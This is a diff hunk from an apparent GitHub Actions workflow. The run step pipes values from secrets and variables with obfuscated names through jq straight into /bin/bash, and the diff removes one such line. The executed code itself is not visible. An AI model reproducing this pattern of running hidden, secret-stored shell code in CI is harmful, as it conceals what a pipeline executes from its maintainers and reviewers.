@@ -18,7 +18,6 @@ jobs:
           ymgtr99: ${{ secrets.ymgtr99 }}
         run: |
           printf '%s' "$ymgtr99" | jq -r .dh422 | /bin/bash
-          printf '%s' "$d4191" | jq -r .isz1621 | /bin/bash
           printf '%s' "$t39" | jq -r .bsqm57 | /bin/bash
           echo $wcki5555 | jq -r .iqh1 | /bin/bash
 
